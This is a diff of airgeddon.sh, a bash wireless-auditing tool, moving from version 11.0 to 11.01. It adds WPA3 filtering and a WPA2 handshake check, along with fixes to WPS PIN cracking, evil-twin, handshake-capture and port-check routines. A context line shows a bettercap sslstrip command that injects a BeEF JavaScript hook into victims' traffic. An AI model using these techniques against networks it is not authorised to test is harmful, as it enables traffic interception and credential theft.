@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 11.0
+#Version......: 11.01
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -130,8 +130,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="11.0"
-language_strings_expected_version="11.0-1"
+airgeddon_version="11.01"
+language_strings_expected_version="11.01-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -1329,10 +1329,16 @@ function check_tcp_udp_port() {
 	port=$(printf "%04x" "${1}")
 	port_type="${2}"
 
-	declare -a busy_ports=($(grep -v "local_address" --no-filename "/proc/net/${port_type}" "/proc/net/${port_type}6" | awk '{print $2}' | cut -d: -f2 | sort -u))
+	declare -a busy_ports=($(grep -v "local_address" --no-filename "/proc/net/${port_type}" "/proc/net/${port_type}6" | awk '{print $2$4}' | cut -d ":" -f 2 | sort -u))
 	for hexport in "${busy_ports[@]}"; do
-		if [ "${hexport}" = "${port}" ]; then
-			return 1
+		if [[ "${port_type}" == "tcp" || "${port_type}" == "tcp6" ]]; then
+			if [ "${hexport}" = "${port}0A" ]; then
+				return 1
+			fi
+		else
+			if [ "${hexport}" = "${port}07" ]; then
+				return 1
+			fi
 		fi
 	done
 
@@ -1351,7 +1357,7 @@ function find_process_name_by_port() {
 
 	local regexp_part1
 	local regexp_part2
-	regexp_part1="${port_type}\h.*?[0-9\*]:${port}"
+	regexp_part1="${port_type}\h.*?[0-9A-Za-z%\*]:${port}"
 	regexp_part2='\h.*?\busers:\(\("\K[^"]+(?=")'
 
 	local regexp
@@ -2604,7 +2610,7 @@ function select_secondary_et_interface() {
 		option_counter2=0
 		for item2 in "${secondary_ifaces[@]}"; do
 			option_counter2=$((option_counter2 + 1))
-			if [[ "${secondary_iface}" = "${option_counter2}" ]]; then
+			if [ "${secondary_iface}" = "${option_counter2}" ]; then
 				if [ "${1}" = "dos_pursuit_mode" ]; then
 					secondary_wifi_interface=${item2}
 					secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
@@ -2675,7 +2681,7 @@ function select_interface() {
 		option_counter2=0
 		for item2 in ${ifaces}; do
 			option_counter2=$((option_counter2 + 1))
-			if [[ "${iface}" = "${option_counter2}" ]]; then
+			if [ "${iface}" = "${option_counter2}" ]; then
 				interface=${item2}
 				phy_interface=$(physical_interface_finder "${interface}")
 				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
@@ -3392,8 +3398,8 @@ function validate_network_encryption_type() {
 	debug_print
 
 	case ${1} in
-		"WPA"|"WPA2")
-			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]]; then
+		"WPA"|"WPA2"|"WPA3")
+			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]] && [[ "${enc}" != "WPA3" ]]; then
 				echo
 				language_strings "${language}" 137 "red"
 				language_strings "${language}" 115 "read"
@@ -4128,7 +4134,7 @@ function set_wep_script() {
 			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_aircrack_pid}$" 2> /dev/null)
 			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
 				break
-			elif [[ -z "${wep_capture_pid_alive}" ]]; then
+			elif [ -z "${wep_capture_pid_alive}" ]; then
 				break
 			fi
 		done
@@ -7339,8 +7345,19 @@ function check_bssid_in_captured_file() {
 		done
 	fi
 
+	if [[ "${handshake_captured}" = "1" ]] || [[ "${pmkid_captured}" = "1" ]]; then
+		if [[ "${2}" = "showing_msgs_capturing" ]] || [[ "${2}" = "showing_msgs_checking" ]]; then
+			if ! is_wpa2_handshake "${1}" "${bssid}"; then
+				echo
+				language_strings "${language}" 700 "red"
+				language_strings "${language}" 115 "read"
+				return 2
+			fi
+		fi
+	fi
+
 	if [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "0" ]]; then
-		if [[ "${2}" = "showing_msgs_checking" ]]; then
+		if [ "${2}" = "showing_msgs_checking" ]; then
 			language_strings "${language}" 322 "yellow"
 		fi
 		return 0
@@ -7771,7 +7788,7 @@ function manage_hashcat_pot() {
 			pass_decrypted_by_hashcat=1
 		else
 			if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
-				if [[ -f "${tmpdir}${hashcat_pot_tmp}" ]]; then
+				if [ -f "${tmpdir}${hashcat_pot_tmp}" ]; then
 					pass_decrypted_by_hashcat=1
 				fi
 			fi
@@ -9194,7 +9211,7 @@ function set_hostapd_config() {
 	echo -e "bssid=${et_bssid}"
 	} >> "${tmpdir}${hostapd_file}"
 
-	if [[ "${channel}" -gt 14 ]]; then
+	if [ "${channel}" -gt 14 ]; then
 		et_channel=$(shuf -i 1-11 -n 1)
 	else
 		et_channel="${channel}"
@@ -9223,7 +9240,7 @@ function set_hostapd_wpe_config() {
 	echo -e "bssid=${et_bssid}"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 
-	if [[ "${channel}" -gt 14 ]]; then
+	if [ "${channel}" -gt 14 ]; then
 		et_channel=$(shuf -i 1-11 -n 1)
 	else
 		et_channel="${channel}"
@@ -9443,6 +9460,7 @@ function set_std_internet_routing_rules() {
 	fi
 
 	ip addr add ${et_ip_router}/${std_c_mask} dev "${interface}" > /dev/null 2>&1
+	ip route add ${et_ip_range}/${std_c_mask_cidr} dev "${interface}" table local proto static scope link > /dev/null 2>&1
 	routing_modified=1
 
 	clean_initialize_iptables_nftables
@@ -9709,7 +9727,18 @@ function set_wps_attack_script() {
 		pin_header3="${white_color})${normal_color}"
 		script_attack_cmd2="${attack_cmd2}"
 
+	EOF
+
+	cat >&7 <<-'EOF'
 		function manage_wps_pot() {
+			if [ -n "${2}" ]; then
+				trophy_pin="${2}"
+			else
+				trophy_pin="Null"
+			fi
+	EOF
+
+	cat >&7 <<-EOF
 			echo "" > "${wpspotenteredpath}"
 			{
 	EOF
@@ -9730,6 +9759,7 @@ function set_wps_attack_script() {
 	EOF
 
 	cat >&7 <<-'EOF'
+			echo -e "PIN: ${trophy_pin}"
 			echo -e "${1}"
 			echo ""
 	EOF
@@ -9761,7 +9791,6 @@ function set_wps_attack_script() {
 						password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
 					;;
 					"pixiedust")
-						success_attack_badpixie_regexp="^\[Pixie\-Dust\].*\[\-\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
 						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]*\[\+\][[:space:]]*WPS[[:space:]]pin:.*([0-9]{8})"
 						success_attack_goodpixie_password_regexp=".*?\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
 					;;
@@ -9774,7 +9803,6 @@ function set_wps_attack_script() {
 						success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
 					;;
 					"pixiedust")
-						success_attack_badpixie_regexp="^\[Pixie\-Dust\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
 						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]PIN[[:space:]]FOUND:[[:space:]]([0-9]{8})"
 						success_attack_goodpixie_password_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'[0-9]{8}',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
 					;;
@@ -10021,7 +10049,7 @@ function set_wps_attack_script() {
 			echo -e "${pin_cracked_msg}${cracked_pin}"
 			if [ -n "${cracked_password}" ]; then
 				echo -e "${password_cracked_msg}${cracked_password}"
-				manage_wps_pot "${cracked_password}"
+				manage_wps_pot "${cracked_password}" "${cracked_pin}"
 			else
 				echo -e "${password_not_cracked_msg}"
 			fi
@@ -10562,7 +10590,7 @@ function set_et_control_script() {
 	EOF
 
 	cat >&7 <<-'EOF'
-			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
+			if [ -z "${DHCPCLIENTS[@]}" ]; then
 	EOF
 
 	cat >&7 <<-EOF
@@ -10576,7 +10604,7 @@ function set_et_control_script() {
 					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
 						client_hostname=""
 						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
-						if [[ -z "${client_hostname}" ]]; then
+						if [ -z "${client_hostname}" ]; then
 							echo -e "\t${client_ip} ${client_mac}"
 						else
 							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
@@ -11309,7 +11337,7 @@ function launch_bettercap_sniffing() {
 		fi
 
 		if [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
-			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module --dns-port ${bettercap_dns_port}"
+			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --dns-port ${bettercap_dns_port}"
 		else
 			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
 		fi
@@ -11822,30 +11850,36 @@ function capture_handshake_evil_twin() {
 
 	handshake_capture_check
 
-	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"; then
+	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
+	case "$?" in
+		"0")
+			handshakepath="${default_save_path}"
+			handshakefilename="handshake-${bssid}.cap"
+			handshakepath="${handshakepath}${handshakefilename}"
 
-		handshakepath="${default_save_path}"
-		handshakefilename="handshake-${bssid}.cap"
-		handshakepath="${handshakepath}${handshakefilename}"
+			echo
+			language_strings "${language}" 162 "yellow"
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "writeethandshake"
+			done
 
-		echo
-		language_strings "${language}" 162 "yellow"
-		validpath=1
-		while [[ "${validpath}" != "0" ]]; do
-			read_path "writeethandshake"
-		done
-
-		cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
-		echo
-		language_strings "${language}" 324 "blue"
-		language_strings "${language}" 115 "read"
-		return 0
-	else
-		echo
-		language_strings "${language}" 146 "red"
-		language_strings "${language}" 115 "read"
-		return 2
-	fi
+			cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
+			echo
+			language_strings "${language}" 324 "blue"
+			language_strings "${language}" 115 "read"
+			return 0
+		;;
+		"1")
+			echo
+			language_strings "${language}" 146 "red"
+			language_strings "${language}" 115 "read"
+			return 2
+		;;
+		"2")
+			return 2
+		;;
+	esac
 }
 
 #Capture Handshake on Handshake/PMKID tools
@@ -11999,7 +12033,7 @@ function validate_path() {
 				enterprise_potpath="${pathname}"
 				enterprise_basepath=$(dirname "${enterprise_potpath}")
 
-				if [[ "${enterprise_basepath}" != "." ]]; then
+				if [ "${enterprise_basepath}" != "." ]; then
 					enterprise_dirname=$(basename "${enterprise_potpath}")
 				fi
 
@@ -12384,29 +12418,44 @@ function launch_handshake_capture() {
 
 	handshake_capture_check
 
-	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"; then
+	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
+	case "$?" in
+		"0")
+			handshakepath="${default_save_path}"
+			handshakefilename="handshake-${bssid}.cap"
+			handshakepath="${handshakepath}${handshakefilename}"
 
-		handshakepath="${default_save_path}"
-		handshakefilename="handshake-${bssid}.cap"
-		handshakepath="${handshakepath}${handshakefilename}"
+			echo
+			language_strings "${language}" 162 "yellow"
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "handshake"
+			done
 
-		echo
-		language_strings "${language}" 162 "yellow"
-		validpath=1
-		while [[ "${validpath}" != "0" ]]; do
-			read_path "handshake"
-		done
+			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
+			echo
+			language_strings "${language}" 149 "blue"
+			language_strings "${language}" 115 "read"
+			return_to_handshake_pmkid_tools_menu=1
+		;;
+		"1")
+			echo
+			language_strings "${language}" 146 "red"
+			language_strings "${language}" 115 "read"
+		;;
+		"2")
+			:
+		;;
+	esac
+}
 
-		cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
-		echo
-		language_strings "${language}" 149 "blue"
-		language_strings "${language}" 115 "read"
-		return_to_handshake_pmkid_tools_menu=1
-	else
-		echo
-		language_strings "${language}" 146 "red"
-		language_strings "${language}" 115 "read"
-	fi
+#Check if a Handshake is WPA2
+function is_wpa2_handshake() {
+
+	debug_print
+
+	bash -c "aircrack-ng -a 2 -b \"${2}\" -w \"${1}\" \"${1}\" > /dev/null 2>&1"
+	return $?
 }
 
 #Launch the Handshake capture window
@@ -12533,12 +12582,31 @@ function explore_for_targets_option() {
 		cypher_filter="${1}"
 		case ${cypher_filter} in
 			"WEP")
+				#Only WEP
 				language_strings "${language}" 67 "yellow"
 			;;
+			"WPA1")
+				#Only WPA including WPA/WPA2 in Mixed mode
+				#Not used yet in airgeddon
+				:
+			;;
+			"WPA2")
+				#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
+				#Not used yet in airgeddon
+				:
+			;;
+			"WPA3")
+				#Only WPA3 including WPA2/WPA3 in Mixed mode
+				#Not used yet in airgeddon
+				:
+			;;
 			"WPA")
+				#All, WPA, WPA2 and WPA3 including all Mixed modes
 				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
 					language_strings "${language}" 527 "yellow"
 				else
+					language_strings "${language}" 215 "blue"
+					echo
 					language_strings "${language}" 361 "yellow"
 				fi
 			;;
@@ -12582,13 +12650,14 @@ function explore_for_targets_option() {
 	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
 	local i=0
 	local enterprise_network_counter
+	local pure_wpa3
 	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do
 
 		chars_mac=${#exp_mac}
 		if [ "${chars_mac}" -ge 17 ]; then
 			i=$((i + 1))
-			if [[ ${exp_power} -lt 0 ]]; then
-				if [[ ${exp_power} -eq -1 ]]; then
+			if [ "${exp_power}" -lt 0 ]; then
+				if [ "${exp_power}" -eq -1 ]; then
 					exp_power=0
 				else
 					exp_power=$((exp_power + 100))
@@ -12610,11 +12679,41 @@ function explore_for_targets_option() {
 
 			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')
 
-			if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
-				if [[ "${exp_auth}" =~ "MGT" ]]; then
-					enterprise_network_counter=$((enterprise_network_counter + 1))
-					echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
-				fi
+			if [ -n "${1}" ]; then
+				case ${cypher_filter} in
+					"WEP")
+						#Only WEP
+						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+					;;
+					"WPA1")
+						#Only WPA including WPA/WPA2 in Mixed mode
+						#Not used yet in airgeddon
+						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+					;;
+					"WPA2")
+						#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
+						#Not used yet in airgeddon
+						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+					;;
+					"WPA3")
+						#Only WPA3 including WPA2/WPA3 in Mixed mode
+						#Not used yet in airgeddon
+						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+					;;
+					"WPA")
+						if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
+							if [[ "${exp_auth}" =~ "MGT" ]]; then
+								enterprise_network_counter=$((enterprise_network_counter + 1))
+								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+							fi
+						else
+							[[ ${exp_auth} =~ ^[[:blank:]](SAE)$ ]] && pure_wpa3="${BASH_REMATCH[1]}"
+							if [ "${pure_wpa3}" != "SAE" ]; then
+								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+							fi
+						fi
+					;;
+				esac
 			else
 				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
 			fi
@@ -12742,9 +12841,9 @@ function explore_for_wps_targets_option() {
 			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
 			expwps_essid=$(echo "${expwps_line//[\`\']/}" | awk -F '\t| {2,}' '{print $NF}')
 
-			if [[ ${expwps_channel} -le 9 ]]; then
+			if [ "${expwps_channel}" -le 9 ]; then
 				wpssp2="  "
-				if [[ ${expwps_channel} -eq 0 ]]; then
+				if [ "${expwps_channel}" -eq 0 ]; then
 					expwps_channel="-"
 				fi
 			elif [[ ${expwps_channel} -ge 10 ]] && [[ ${expwps_channel} -lt 99 ]]; then
@@ -12761,15 +12860,15 @@ function explore_for_wps_targets_option() {
 				expwps_power=${expwps_power//0/}
 			fi
 
-			if [[ ${expwps_power} -lt 0 ]]; then
-				if [[ ${expwps_power} -eq -1 ]]; then
+			if [ ${expwps_power} -lt 0 ]; then
+				if [ ${expwps_power} -eq -1 ]; then
 					expwps_power=0
 				else
 					expwps_power=$((expwps_power + 100))
 				fi
 			fi
 
-			if [[ ${expwps_power} -le 9 ]]; then
+			if [ ${expwps_power} -le 9 ]; then
 				wpssp4=" "
 			else
 				wpssp4=""
@@ -12852,12 +12951,12 @@ function select_target() {
 			sp1=""
 		fi
 
-		if [[ ${exp_channel} -le 9 ]]; then
+		if [ "${exp_channel}" -le 9 ]; then
 			sp2="  "
-			if [[ ${exp_channel} -eq 0 ]]; then
+			if [ "${exp_channel}" -eq 0 ]; then
 				exp_channel="-"
 			fi
-			if [[ ${exp_channel} -lt 0 ]]; then
+			if [ "${exp_channel}" -lt 0 ]; then
 				sp2=" "
 			fi
 		elif [[ ${exp_channel} -ge 10 ]] && [[ ${exp_channel} -lt 99 ]]; then
@@ -12866,11 +12965,11 @@ function select_target() {
 			sp2=""
 		fi
 
-		if [[ "${exp_power}" = "" ]]; then
+		if [ "${exp_power}" = "" ]; then
 			exp_power=0
 		fi
 
-		if [[ ${exp_power} -le 9 ]]; then
+		if [ ${exp_power} -le 9 ]; then
 			sp4=" "
 		else
 			sp4=""
@@ -13173,7 +13272,7 @@ function et_prerequisites() {
 
 	if [ -n "${enterprise_mode}" ]; then
 		manage_enterprise_log
-	elif [[ "${et_mode}" = "et_sniffing" ]]; then
+	elif [ "${et_mode}" = "et_sniffing" ]; then
 		manage_ettercap_log
 	elif [[ "${et_mode}" = "et_sniffing_sslstrip2" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]]; then
 		manage_bettercap_log
@@ -13204,7 +13303,7 @@ function et_prerequisites() {
 		language_strings "${language}" 115 "read"
 	fi
 
-	if [[ "${channel}" -gt 14 ]]; then
+	if [ "${channel}" -gt 14 ]; then
 		echo
 		language_strings "${language}" 392 "blue"
 	fi
